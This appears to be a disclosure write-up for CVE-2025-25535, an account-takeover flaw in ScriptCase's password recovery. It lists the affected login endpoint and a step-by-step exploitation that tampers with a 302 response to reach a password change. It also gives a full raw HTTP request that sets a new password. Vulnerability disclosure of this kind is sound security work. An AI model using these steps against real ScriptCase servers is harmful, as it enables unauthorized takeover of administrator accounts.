## CVE-2025-25535: HTTP Response Manipulation Leading to Full Account Takeover

## Vulnerability Description

The CVE-2025-25535 vulnerability is a critical security flaw in ScriptCase Version 1.0.002 â€“ Build 7, which allows an attacker to manipulate HTTP responses to bypass authentication mechanisms and take full control of an administrator account. This flaw occurs due to inadequate validation of tokens and request authenticity in the password recovery functionality.
By intercepting and modifying the HTTP response of the login page, an attacker can force the display of the password recovery screen without needing to validate the email or know the previous password. This allows the attacker to change the password of any user, including administrator accounts, resulting in a full account takeover.

## Affected Components

Login Page: http://IP:8092/scriptcase/prod/lib/php/devel/iface/login.php

Password Recovery Functionality: Endpoint responsible for processing password changes.

## Impact

Unauthorized Access: An attacker can take control of administrator accounts, gaining full access to the production environment.
System Compromise: Access to sensitive data, system configurations, and critical functionalities.
Lack of Validation: The absence of token validation or request authenticity checks makes exploitation trivial.

## Step-by-Step Exploitation
1.Request Interception:
Use an interception tool like Burp Suite or OWASP ZAP to capture the login request.

2.HTTP Response Manipulation:
Change the response code from HTTP/302 (Redirect) to HTTP/200 (Success).
This forces the display of the password recovery screen, bypassing email and previous password validation.

3.Password Change:
Enter a new password in the recovery field.
Confirm the change, taking control of the account.

4.Access to the Administration Panel:
Use the altered credentials to access the ScriptCase administration panel.

## Example Payload

```
POST /scriptcase/prod/lib/php/devel/iface/login.php HTTP/1.1
Host: IP:8092
Content-Length: 118
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://IP:8092
Referer: http://192.168.100.163:8092/scriptcase/prod/lib/php/devel/iface/login.php?rand=a35a0d78d62a01
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=oh6pfmn198puvikv64hm91ni56; sales1.scriptcase-_zldp=%2Blf8JBkbzCQR1XJIvHDapdREcwzHVAx1Ak1yo%2B%2B12MHvy8myWMeVPxDkMUYHQXCt61H4KQEA5qU%3D; sales1.scriptcase-_zldt=926de0b1-a19b-4e89-81b6-ca6fe8502c37-0
Connection: close

ajax=nm&nm_action=change_pass&email=test%40test.com&pass_new=Teste123456&pass_conf=Teste123456&lang=pt-br&captcha=PSHE
```
